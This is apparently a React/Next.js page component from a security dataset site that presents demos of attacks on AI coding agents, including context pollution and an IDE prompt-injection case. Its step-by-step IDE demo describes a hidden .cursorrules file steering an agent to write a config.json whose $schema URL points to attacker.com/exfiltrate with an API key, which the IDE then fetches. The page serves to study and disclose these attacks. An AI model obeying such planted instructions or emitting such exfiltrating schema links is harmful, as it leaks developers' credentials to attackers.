"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import { ArrowLeft } from "lucide-react"
import { Badge } from "@/components/ui/badge"
import { cn } from "@/lib/utils"

// 数据集信息
const datasetInfo: Record<string, { 
  title: string; 
  category: string; 
  description: string;
  videoPath?: string;
  attackType?: string;
  riskLevel?: "low" | "medium" | "high" | "critical";
}> = {
  "1": {
    title: "Dataset1 - Data Leakage",
    category: "data leakage",
    description: "Demonstration of credential and user information leakage vulnerabilities",
    videoPath: "/demo-video/1-Data_Leakage.mp4",
    attackType: "Information Disclosure",
    riskLevel: "high"
  },
  "2": {
    title: "Dataset2 - Host Environment Destruction",
    category: "host environment destruction",
    description: "Demonstration of file system destruction and privilege escalation attacks",
    videoPath: "/demo-video/2-Host_Env_Destruction.mp4",
    attackType: "System Compromise",
    riskLevel: "critical"
  },
  "3": {
    title: "Dataset3 - Harmful Code Generation",
    category: "harmful code generation",
    description: "Demonstration of malicious code generation and supply chain poisoning",
    videoPath: "/demo-video/3-Harmful_Code_Gen.mp4",
    attackType: "Code Injection",
    riskLevel: "critical"
  },
  "4": {
    title: "Dataset4 - Resource Misuse",
    category: "resource misuse",
    description: "Demonstration of token and system resource exploitation",
    videoPath: "/demo-video/4-Resource_Misuse.mp4",
    attackType: "Resource Exhaustion",
    riskLevel: "medium"
  },
  "5": {
    title: "Dataset5 - Context Pollution",
    category: "context pollution",
    description: "Demonstration of malicious instruction persistence through context pollution",
    videoPath: "/demo-video/5-Context_Pollution(malicious_instruction_persistence.mp4",
    attackType: "Context Injection",
    riskLevel: "high"
  },
  "6": {
    title: "Dataset6 - IDE-Specific Vulnerabilities",
    category: "ide-specific vulnerabilities",
    description: "Demonstration of IDE configuration exploits and prompt injection attacks",
    videoPath: "/demo-video/6-IDE_specific.mp4",
    attackType: "Configuration Exploit",
    riskLevel: "critical"
  }
}

// Risk level colors
const riskLevelColors = {
  low: "bg-emerald-500/10 text-emerald-400 border-emerald-500/30",
  medium: "bg-yellow-500/10 text-yellow-400 border-yellow-500/30",
  high: "bg-orange-500/10 text-orange-400 border-orange-500/30",
  critical: "bg-red-500/10 text-red-400 border-red-500/30",
}

// Generic Video Demo Component for datasets 1-4
function VideoDemo({ datasetId, info }: { 
  datasetId: string; 
  info: typeof datasetInfo[keyof typeof datasetInfo] 
}) {
  const [isPlaying, setIsPlaying] = useState(false)

  if (!info.videoPath) return null

  return (
    <div className="max-w-5xl mx-auto">
      {/* Hero Section */}
      <div className="text-center mb-8">
        <div className="inline-flex items-center gap-2 mb-4">
          <Badge className={cn("font-mono", info.riskLevel && riskLevelColors[info.riskLevel])}>
            {info.riskLevel?.toUpperCase()}
          </Badge>
          <span className="text-sm text-muted-foreground">{info.attackType}</span>
        </div>
        <h2 className="text-3xl sm:text-4xl font-bold mb-3">
          {info.title.split(' - ')[1]}
        </h2>
        <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
          {info.description}
        </p>
      </div>

      {/* Video Player */}
      <div className="mb-8">
        <div className="relative rounded-xl overflow-hidden border border-border bg-black/40 shadow-2xl">
          <video
            className="w-full aspect-video"
            controls
            preload="metadata"
            onPlay={() => setIsPlaying(true)}
            onPause={() => setIsPlaying(false)}
          >
            <source 
              src={info.videoPath} 
              type="video/mp4" 
            />
            Your browser does not support the video tag.
          </video>
          
          {/* Play overlay when paused */}
          {!isPlaying && (
            <div className="absolute inset-0 flex items-center justify-center bg-black/20 pointer-events-none">
              <div className="w-16 h-16 rounded-full bg-primary/90 flex items-center justify-center">
                <div className="w-0 h-0 border-l-8 border-l-white border-y-6 border-y-transparent ml-1"></div>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Description Card */}
      <div className="mb-8 p-6 rounded-xl border border-border bg-card/40 glass">
        <h3 className="font-semibold text-lg mb-3">Attack Overview</h3>
        <p className="text-muted-foreground leading-relaxed mb-4">
          This demonstration showcases real-world attack scenarios in the {info.category} category. 
          The video illustrates how coding agents can be exploited through carefully crafted prompts 
          and malicious instructions, highlighting the importance of security measures in AI-assisted development.
        </p>
        <div className="grid md:grid-cols-2 gap-4 mt-4">
          <div className="p-4 rounded-lg bg-secondary/40 border border-border/40">
            <div className={cn("text-xs font-mono uppercase tracking-wider mb-2", 
              info.riskLevel === "critical" ? "text-red-400" : 
              info.riskLevel === "high" ? "text-orange-400" : 
              info.riskLevel === "medium" ? "text-yellow-400" : "text-emerald-400"
            )}>
              Attack Vector
            </div>
            <p className="text-sm text-muted-foreground">
              {info.attackType}
            </p>
          </div>
          <div className="p-4 rounded-lg bg-secondary/40 border border-border/40">
            <div className={cn("text-xs font-mono uppercase tracking-wider mb-2",
              info.riskLevel === "critical" ? "text-red-400" : 
              info.riskLevel === "high" ? "text-orange-400" : 
              info.riskLevel === "medium" ? "text-yellow-400" : "text-emerald-400"
            )}>
              Risk Level
            </div>
            <p className="text-sm text-muted-foreground">
              {info.riskLevel?.charAt(0).toUpperCase() + info.riskLevel?.slice(1)} severity security threat
            </p>
          </div>
        </div>
      </div>

      {/* Key Points */}
      <div className="grid md:grid-cols-3 gap-4">
        <div className="p-6 rounded-xl border border-border bg-card/40">
          <div className="text-2xl font-bold text-primary mb-2">01</div>
          <h4 className="font-semibold mb-2">Vulnerability Identification</h4>
          <p className="text-sm text-muted-foreground">
            Understanding the security weakness in AI agent systems
          </p>
        </div>
        <div className="p-6 rounded-xl border border-border bg-card/40">
          <div className="text-2xl font-bold text-primary mb-2">02</div>
          <h4 className="font-semibold mb-2">Attack Execution</h4>
          <p className="text-sm text-muted-foreground">
            Step-by-step demonstration of the exploitation process
          </p>
        </div>
        <div className="p-6 rounded-xl border border-border bg-card/40">
          <div className="text-2xl font-bold text-primary mb-2">03</div>
          <h4 className="font-semibold mb-2">Impact Assessment</h4>
          <p className="text-sm text-muted-foreground">
            Analyzing the potential damage and security implications
          </p>
        </div>
      </div>
    </div>
  )
}

// Context Pollution Demo Component
function ContextPollutionDemo({ info }: { info: typeof datasetInfo[keyof typeof datasetInfo] }) {
  const [isPlaying, setIsPlaying] = useState(false)

  return (
    <div className="max-w-5xl mx-auto">
      {/* Hero Section */}
      <div className="text-center mb-8">
        <div className="inline-flex items-center gap-2 mb-4">
          <Badge className="bg-orange-500/10 text-orange-400 border-orange-500/30 font-mono">
            HIGH
          </Badge>
          <span className="text-sm text-muted-foreground">Malicious Instruction Persistence</span>
        </div>
        <h2 className="text-3xl sm:text-4xl font-bold mb-3">
          Context Pollution Attack
        </h2>
        <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
          Demonstration of malicious prompt injection through context pollution
        </p>
      </div>

      {/* Video Player */}
      <div className="mb-8">
        <div className="relative rounded-xl overflow-hidden border border-border bg-black/40 shadow-2xl">
          <video
            className="w-full aspect-video"
            controls
            preload="metadata"
            onPlay={() => setIsPlaying(true)}
            onPause={() => setIsPlaying(false)}
          >
            <source 
              src={info.videoPath || "/demo-video/5-Context_Pollution(malicious_instruction_persistence.mp4"} 
              type="video/mp4" 
            />
            Your browser does not support the video tag.
          </video>
          
          {/* Play overlay when paused */}
          {!isPlaying && (
            <div className="absolute inset-0 flex items-center justify-center bg-black/20 pointer-events-none">
              <div className="w-16 h-16 rounded-full bg-primary/90 flex items-center justify-center">
                <div className="w-0 h-0 border-l-8 border-l-white border-y-6 border-y-transparent ml-1"></div>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Description */}
      <div className="mb-8 p-6 rounded-xl border border-border bg-card/40 glass">
        <h3 className="font-semibold text-lg mb-3">Attack Overview</h3>
        <p className="text-muted-foreground leading-relaxed mb-4">
          This demonstration shows how malicious instructions can be injected and persisted 
          in the AI agent's context through carefully crafted prompts. The attacker exploits 
          the context window to maintain malicious instructions across multiple interactions.
        </p>
        <div className="grid md:grid-cols-2 gap-4 mt-4">
          <div className="p-4 rounded-lg bg-secondary/40 border border-border/40">
            <div className="text-xs font-mono uppercase tracking-wider text-orange-400 mb-2">
              Attack Vector
            </div>
            <p className="text-sm text-muted-foreground">
              Context injection through hidden prompts
            </p>
          </div>
          <div className="p-4 rounded-lg bg-secondary/40 border border-border/40">
            <div className="text-xs font-mono uppercase tracking-wider text-orange-400 mb-2">
              Impact
            </div>
            <p className="text-sm text-muted-foreground">
              Persistent malicious behavior in AI responses
            </p>
          </div>
        </div>
      </div>

      {/* Key Points */}
      <div className="grid md:grid-cols-3 gap-4">
        <div className="p-6 rounded-xl border border-border bg-card/40">
          <div className="text-2xl font-bold text-primary mb-2">01</div>
          <h4 className="font-semibold mb-2">Context Injection</h4>
          <p className="text-sm text-muted-foreground">
            Malicious instructions are injected into the context window
          </p>
        </div>
        <div className="p-6 rounded-xl border border-border bg-card/40">
          <div className="text-2xl font-bold text-primary mb-2">02</div>
          <h4 className="font-semibold mb-2">Instruction Persistence</h4>
          <p className="text-sm text-muted-foreground">
            Instructions remain active across multiple interactions
          </p>
        </div>
        <div className="p-6 rounded-xl border border-border bg-card/40">
          <div className="text-2xl font-bold text-primary mb-2">03</div>
          <h4 className="font-semibold mb-2">Behavior Manipulation</h4>
          <p className="text-sm text-muted-foreground">
            AI agent behavior is altered without user awareness
          </p>
        </div>
      </div>
    </div>
  )
}

// IDE Vulnerability Demo Component
function IDEVulnerabilityDemo({ info }: { info: typeof datasetInfo[keyof typeof datasetInfo] }) {
  const [currentStep, setCurrentStep] = useState(0)
  const [isPlaying, setIsPlaying] = useState(false)

  const steps = [
    {
      label: "Clone Project",
      title: "User clones a seemingly normal project",
      code: `$ git clone https://github.com/malicious/project.git
$ cd project
$ ls -la

.cursorrules          # Hidden malicious prompt
package.json
README.md`,
      description: "The project contains a hidden .cursorrules file with carefully crafted malicious prompts."
    },
    {
      label: "IDE Configuration",
      title: "CodeBuddy enables dangerous option by default",
      code: `// settings.json
{
  "json.schemaDownload.enable": true,  // Enabled by default
  "json.validate.enable": true
}

// This allows JSON files to download external schemas`,
      description: "This configuration provides network request capabilities for the attack, a typical case of overly broad trust boundaries."
    },
    {
      label: "Request Help",
      title: "Triggering the malicious prompt",
      code: `User: "Help me configure the project settings"

AI Agent reading project context...
[Reading] .cursorrules
[Executing] Hidden malicious instructions...`,
      description: "The malicious prompt is read and executed by the Agent at this moment, completely unknown to the user."
    },
    {
      label: "Generate File",
      title: "Agent generates JSON with malicious payload",
      code: `// config.json (AI generated)
{
  "$schema": "https://attacker.com/exfiltrate?data=...",
  "name": "project-config",
  "settings": {
    "apiKey": "\${process.env.API_KEY}"
  }
}`,
      description: "The $schema field points to the attacker's server, ready to steal environment variables and sensitive information."
    },
    {
      label: "Send Request",
      title: "IDE automatically sends HTTP request",
      code: `# Network request log
GET https://attacker.com/exfiltrate?data=... HTTP/1.1

Leaked information:
- API keys
- Database passwords
- Project paths
- User information`,
      description: "Without the user's knowledge, sensitive data has been sent to the attacker's server via HTTP request."
    },
    {
      label: "Data Breach",
      title: "Attacker successfully obtains sensitive information",
      code: `# Data received by attacker's server
{
  "apiKey": "sk-xxxxxxxxxxxxx",
  "dbPassword": "MySecretP@ss123",
  "projectPath": "/Users/dev/project",
  "timestamp": "2025-01-15T10:30:00Z"
}`,
      description: "Attack successful. The attacker can use these credentials to access databases, API services, or conduct further attacks."
    }
  ]

  const progress = ((currentStep + 1) / steps.length) * 100

  return (
    <div className="max-w-5xl mx-auto">
      {/* Hero Section */}
      <div className="text-center mb-12">
        <div className="inline-flex items-center gap-2 mb-4">
          <Badge className="bg-red-500/10 text-red-400 border-red-500/30 font-mono">
            CRITICAL
          </Badge>
          <span className="text-sm text-muted-foreground">CodeBuddy 4.1.1</span>
        </div>
        <h2 className="text-3xl sm:text-4xl font-bold mb-3">
          IDE-Specific Vulnerability
        </h2>
        <p className="text-lg text-muted-foreground max-w-2xl mx-auto">
          Prompt Injection + IDE Configuration Exploit
        </p>
      </div>

      {/* Video Player Section */}
      <div className="mb-12">
        <h3 className="font-semibold text-xl mb-4">Attack Demonstration Video</h3>
        <div className="relative rounded-xl overflow-hidden border border-border bg-black/40 shadow-2xl">
          <video
            className="w-full aspect-video"
            controls
            preload="metadata"
            onPlay={() => setIsPlaying(true)}
            onPause={() => setIsPlaying(false)}
          >
            <source 
              src={info.videoPath || "/demo-video/6-IDE_specific.mp4"} 
              type="video/mp4" 
            />
            Your browser does not support the video tag.
          </video>
          
          {/* Play overlay when paused */}
          {!isPlaying && (
            <div className="absolute inset-0 flex items-center justify-center bg-black/20 pointer-events-none">
              <div className="w-16 h-16 rounded-full bg-primary/90 flex items-center justify-center">
                <div className="w-0 h-0 border-l-8 border-l-white border-y-6 border-y-transparent ml-1"></div>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Interactive Step-by-Step Section */}
      <div className="mb-12 p-6 rounded-xl border border-border bg-card/40">
        <h3 className="font-semibold text-xl mb-6">Interactive Attack Flow</h3>
        
        {/* Progress Bar */}
        <div className="mb-8">
          <div className="flex items-center justify-between mb-3">
            {steps.map((step, index) => (
              <button
                key={index}
                onClick={() => setCurrentStep(index)}
                className={cn(
                  "flex-1 text-center transition-colors",
                  "first:text-left last:text-right"
                )}
              >
                <div className={cn(
                  "font-mono text-xs mb-1 transition-colors",
                  index === currentStep 
                    ? "text-primary font-semibold" 
                    : index < currentStep 
                      ? "text-muted-foreground/60"
                      : "text-muted-foreground/40"
                )}>
                  {step.label}
                </div>
              </button>
            ))}
          </div>
          <div className="h-1 bg-secondary/30 rounded-full overflow-hidden">
            <div 
              className="h-full bg-gradient-to-r from-emerald-500 via-yellow-500 to-red-500 transition-all duration-500"
              style={{ width: `${progress}%` }}
            />
          </div>
        </div>

        {/* Main Content - Alternating Layout with Fixed Height */}
        <div className="mb-8 min-h-[380px]">
          <div className={cn(
            "grid lg:grid-cols-2 gap-8 lg:gap-12 items-center",
            "transition-all duration-700 ease-out"
          )}>
            {/* 奇数步：代码在左，说明在右 */}
            {/* 偶数步：说明在左，代码在右 */}
            
            {currentStep % 2 === 0 ? (
              <>
                {/* 代码块 - 左侧 */}
                <div 
                  key={`code-${currentStep}`}
                  className="order-1 animate-slide-in-left"
                >
                  <div className="rounded-xl bg-gradient-to-br from-black/80 to-black/60 border border-border/30 p-6 lg:p-8 shadow-2xl backdrop-blur">
                    <pre className="text-gray-300 leading-relaxed font-mono text-sm lg:text-base overflow-x-auto">
                      {steps[currentStep].code}
                    </pre>
                  </div>
                </div>

                {/* 说明文字 - 右侧 */}
                <div 
                  key={`text-${currentStep}`}
                  className="order-2 animate-slide-in-right"
                >
                  <div className="space-y-4">
                    <div className="inline-block px-3 py-1 rounded-full bg-primary/10 border border-primary/20">
                      <span className="font-mono text-xs text-primary">
                        Step {currentStep + 1}
                      </span>
                    </div>
                    <h3 className="text-2xl lg:text-3xl font-bold leading-tight">
                      {steps[currentStep].title}
                    </h3>
                    <p className="text-muted-foreground text-lg leading-relaxed">
                      {steps[currentStep].description}
                    </p>
                  </div>
                </div>
              </>
            ) : (
              <>
                {/* 说明文字 - 左侧 */}
                <div 
                  key={`text-${currentStep}`}
                  className="order-1 animate-slide-in-left"
                >
                  <div className="space-y-4">
                    <div className="inline-block px-3 py-1 rounded-full bg-primary/10 border border-primary/20">
                      <span className="font-mono text-xs text-primary">
                        Step {currentStep + 1}
                      </span>
                    </div>
                    <h3 className="text-2xl lg:text-3xl font-bold leading-tight">
                      {steps[currentStep].title}
                    </h3>
                    <p className="text-muted-foreground text-lg leading-relaxed">
                      {steps[currentStep].description}
                    </p>
                  </div>
                </div>

                {/* 代码块 - 右侧 */}
                <div 
                  key={`code-${currentStep}`}
                  className="order-2 animate-slide-in-right"
                >
                  <div className="rounded-xl bg-gradient-to-br from-black/80 to-black/60 border border-border/30 p-6 lg:p-8 shadow-2xl backdrop-blur">
                    <pre className="text-gray-300 leading-relaxed font-mono text-sm lg:text-base overflow-x-auto">
                      {steps[currentStep].code}
                    </pre>
                  </div>
                </div>
              </>
            )}
          </div>
        </div>

        {/* Navigation - Fixed Position */}
        <div className="flex items-center justify-center pt-4">
          {currentStep < steps.length - 1 ? (
            <button
              onClick={() => setCurrentStep(currentStep + 1)}
              className={cn(
                "relative inline-flex items-center justify-center",
                "px-8 py-4 rounded-xl",
                "bg-primary/10 hover:bg-primary/20",
                "border border-primary/30 hover:border-primary/50",
                "transition-all duration-300",
                "hover:shadow-lg hover:shadow-primary/20",
                "active:scale-[0.98]",
                "h-14"
              )}
            >
              <span className="font-semibold">Next Step</span>
            </button>
          ) : (
            <div className="inline-flex items-center gap-3 px-8 py-4 rounded-xl bg-emerald-500/10 border border-emerald-500/30 h-14">
              <span className="font-semibold text-emerald-400">Demo Completed</span>
              <span className="text-muted-foreground">•</span>
              <button
                onClick={() => setCurrentStep(0)}
                className="text-sm text-muted-foreground hover:text-foreground transition-colors underline-offset-4 hover:underline"
              >
                Restart
              </button>
            </div>
          )}
        </div>
      </div>

      {/* Analysis Cards */}
      <div className="grid md:grid-cols-3 gap-4">
        <div className="text-center p-6">
          <div className="text-xs font-mono uppercase tracking-wider text-red-400 mb-2">
            Attack Entry
          </div>
          <p className="text-sm text-muted-foreground">
            Malicious Prompt Injection
          </p>
        </div>
        <div className="text-center p-6">
          <div className="text-xs font-mono uppercase tracking-wider text-orange-400 mb-2">
            Capability Amplification
          </div>
          <p className="text-sm text-muted-foreground">
            IDE Default Configuration
          </p>
        </div>
        <div className="text-center p-6">
          <div className="text-xs font-mono uppercase tracking-wider text-yellow-400 mb-2">
            Final Risk
          </div>
          <p className="text-sm text-muted-foreground">
            Sensitive Data Leakage
          </p>
        </div>
      </div>
    </div>
  )
}

export function DemoPageContent({ datasetId }: { datasetId: string }) {
  const router = useRouter()
  const info = datasetInfo[datasetId] || datasetInfo["1"]

  return (
    <section className="px-4 sm:px-6 py-12 sm:py-20 min-h-screen">
      <div className="mx-auto max-w-6xl">
        {/* Header */}
        <div className="mb-12">
          <button
            onClick={() => router.push(`/datasets/${datasetId}`)}
            className="flex items-center gap-2 font-mono text-xs text-muted-foreground hover:text-primary transition-colors mb-6"
          >
            <ArrowLeft className="h-3.5 w-3.5" />
            Back to Dataset
          </button>

          <Badge className="font-mono text-xs uppercase mb-3 bg-primary/10 text-primary border-primary/30">
            {info.category}
          </Badge>
          <h1 className="text-3xl sm:text-4xl font-bold tracking-tight mb-2">
            {info.title}
          </h1>
          <p className="text-muted-foreground">
            {info.description}
          </p>
        </div>

        {/* Demo Content - 根据datasetId渲染不同的demo组件 */}
        {datasetId === "6" ? (
          <IDEVulnerabilityDemo info={info} />
        ) : datasetId === "5" ? (
          <ContextPollutionDemo info={info} />
        ) : info.videoPath ? (
          <VideoDemo datasetId={datasetId} info={info} />
        ) : (
          <div className="text-center py-20">
            <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-secondary/20 mb-4">
            </div>
            <h2 className="text-xl font-semibold mb-2">
              Demo Coming Soon
            </h2>
            <p className="text-muted-foreground mb-6">
              The interactive demo for this category is under development
            </p>
            <button
              onClick={() => router.push(`/datasets/${datasetId}`)}
              className="inline-flex items-center gap-2 px-4 py-2 rounded-lg border border-border hover:bg-secondary/50 transition-colors"
            >
              <ArrowLeft className="h-4 w-4" />
              Back to Dataset
            </button>
          </div>
        )}
      </div>
    </section>
  )
}
